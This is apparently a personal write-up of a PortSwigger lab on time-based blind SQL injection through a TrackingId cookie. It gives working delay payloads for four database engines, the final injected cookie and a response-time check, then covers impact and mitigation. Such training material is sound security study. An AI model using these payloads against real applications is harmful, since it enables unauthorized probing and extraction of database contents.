# Blind SQL injection with time delays

**Source:** [PortSwigger](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays)  
**Category:** SQL Injection  
**Difficulty:** PRACTITIONER

## Objective
To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay.

## Vulnerability
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

## Exploitation

### Steps

1. Intercepted the HTTP request and identified the `TrackingId` cookie parameter. Sent the request to Burp Repeater for testing.

2. Tested different database-specific time delay payloads to identify the database engine after `TrackingId=dd3HYdwlYwGjuWwU;`

    Oracle:
    ```sql
    '||dbms_pipe.receive_message(('a'),10)--
    ```

    Microsoft SQL Server:
    ```sql
    '; WAITFOR DELAY '0:0:10'--
    ```

    MySQL:
    ```sql
    ' OR SLEEP(10)#
    ```

    PostgreSQL:
    ```sql
    '||(SELECT pg_sleep(10))--
    ```


3. Identified that the PostgreSQL payload caused the HTTP response to be delayed by approximately 10 seconds.

    Final payload:

    ```sql
    '||(SELECT pg_sleep(10))--
    ```

    Injected into the `TrackingId` cookie: `TrackingId=dd3HYdwlYwGjuWwU'||(SELECT pg_sleep(10))--;`

4. Verified the vulnerability by comparing response times.

    Normal request:
    ```text
    Response time: < 1 second
    ```

    Request with SQL injection payload:
    ```text
    Response time: ~10 seconds
    ```

5. The lab was successfully completed after triggering the required 10-second delay.

### Payload

**Oracle**
```sql
'||dbms_pipe.receive_message(('a'),10)--
```

**Microsoft SQL Server**
```sql
'; WAITFOR DELAY '0:0:10'--
```

**MySQL**
```sql
' OR SLEEP(10)#
```

**PostgreSQL**
```sql
'||(SELECT pg_sleep(10))--
```

**Final request**
```http
TrackingId=dd3HYdwlYwGjuWwU'||(SELECT pg_sleep(10))--;
```

### Shortcut

1. Test database-specific time delay payloads to identify the DBMS.
2. Use the payload that introduces a 10-second delay.
3. Confirm the vulnerability by comparing the response time with a normal request.

```http
TrackingId=dd3HYdwlYwGjuWwU'||(SELECT pg_sleep(10))--;
```

## Impact
Time-based blind SQL injection allows attackers to extract information from a database even when query results and errors are not visible. By using conditional delays, attackers can infer database contents character by character, potentially leading to data disclosure and account compromise.

## Mitigation
Use parameterized queries (prepared statements) to ensure user input is treated as data instead of executable SQL code.

Avoid dynamically building SQL queries using user-controlled input. Database accounts used by applications should follow the principle of least privilege to reduce the impact of a successful SQL injection attack.

## Tools
- Burp Suite
- Repeater

## Notes
This lab demonstrates how time-based blind SQL injection works when the application does not reveal query results or database errors.

The key challenge was identifying the database engine. Testing database-specific delay functions allowed determining that the application was using PostgreSQL. Once the correct payload was identified, the vulnerability was confirmed by measuring the increased response time.